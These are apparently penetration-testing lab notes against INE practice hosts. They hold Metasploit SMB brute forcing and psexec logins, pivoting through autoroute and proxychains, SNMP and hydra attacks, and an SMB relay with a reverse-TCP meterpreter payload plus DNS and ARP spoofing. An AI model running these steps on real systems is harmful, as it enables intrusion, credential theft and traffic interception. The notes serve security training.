nmap -sV demo.ine.local -p445 --script smb-enum*
Host script results:
| smb-enum-users: 
|   ATTACKDEFENSE\admin (RID: 1009)
|     Flags:       Normal user account, Password does not expire
|   ATTACKDEFENSE\Administrator (RID: 500)
|     Description: Built-in account for administering the computer/domain
|     Flags:       Normal user account, Password does not expire
|   ATTACKDEFENSE\Guest (RID: 501)
|     Description: Built-in account for guest access to the computer/domain
|     Flags:       Normal user account, Password not required, Password does not expire, Account disabled
|   ATTACKDEFENSE\root (RID: 1010)
|_    Flags:       Normal user account, Password does not expire

scanner/smb/smb_login
    RHOSTS => demo.ine.local
    SMBUSER => administrator
    Pass_FILE => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
    verbose => false
    stop_on_success => true
    run

[+] 10.2.17.109:445       - 10.2.17.109:445 - Success: '.\administrator:password1

windows/smb/psexec
    RHOSTS => demo.ine.local
    SMBUSER => administrator
    SMBPASS => password1
    run

    //Remote host
    cat /Users/Administrator/Documents/Flag1.txt
        8de67f44f49264e6c99e8a8f5f17110c

    ifconfig
    Interface 12
    ============
    Name         : AWS PV Network Device #0
    Hardware MAC : 02:b5:69:43:e2:a3
    MTU          : 9001
    IPv4 Address : 10.2.17.109
    IPv4 Netmask : 255.255.240.0
    IPv6 Address : fe80::d477:2a29:dbe2:3714
    IPv6 Netmask : ffff:ffff:ffff:ffff::


    //Autoroute
    //Manual
        run autoroute -s 10.0.28.125/20
    //metasploit
    multi/manage/autoroute
        session => 1
        subnet => 10.2.17.0
        run

        [*] Running module against ATTACKDEFENSE
        [*] Searching for subnets to autoroute.
        [+] Route added to subnet 10.2.16.0/255.255.240.0 from host's routing table.
        [*] Post module execution completed

    // proxy
    cat /etc/proxychains4.conf
        socks4  127.0.0.1 9050

    server/socks_proxy
        SRVPORT => 9050
        version => 4a
    
    proxychains nmap demo1.ine.local -sT -Pn -sV -p 445
        sessions -i 1
        migrate -N explorer.exe
        shell
        net view 10.0.28.125

        //map folder form target1
        net use D: \\10.0.28.125\Documents
        cat D:\flag.txt
## snmp
    nmap -sU -sV -p 161 demo.ine.local
    nmap -sU -p 161 --script snmp-* demo.ine.local 
        nmap -sU -p 161 demo.ine.local -sV
        | snmp-win32-users: 
        |   Administrator
        |   DefaultAccount
        |   Guest
        |   WDAGUtilityAccount
        |_  admin
    hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
        administrator   password: 
    
    msfconsole -q
    use exploit/windows/smb/psexec
    set RHOSTS demo.ine.local
    set SMBUSER administrator
    set SMBPASS elizabeth
    exploit
        cd C:/
        cat flag.txt
            a8f5f167f44f4964e6c998dee827110c

## DNS & SMB Relay Attack
    use exploit/windows/smb/smb_relay
        set SRVHOST 172.16.5.101
        set PAYLOAD windows/meterpreter/reverse_tcp
        set LHOST 172.16.5.101
        set SMBHOST 172.16.5.10
        exploit

    echo "172.16.5.101 *.sportsfoo.com" > dns
    dnsspoof -i eth1 -f dns

    echo 1 > /proc/sys/net/ipv4/ip_forward

    arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
    arpspoof -i eth1 -t 172.16.5.1 172.16.5.5
